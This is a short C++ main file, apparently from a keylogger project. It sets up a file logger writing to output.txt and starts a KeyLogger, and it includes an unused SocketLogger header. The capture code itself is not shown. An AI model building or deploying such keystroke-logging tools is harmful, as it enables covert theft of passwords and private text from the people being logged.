#include <iostream>
#include "KeyLogger.h"
#include "FileLogger.h"
#include "SocketLogger.h"

using namespace std;

int main()
{
	FileLogger* logger = new FileLogger("output.txt");
    KeyLogger* keyLogger = new KeyLogger(logger);
	
	try {
		keyLogger->StartLogging();
	}
	catch (exception) {
		cout << "Exception received";
	}

	delete logger;
	delete keyLogger;
}
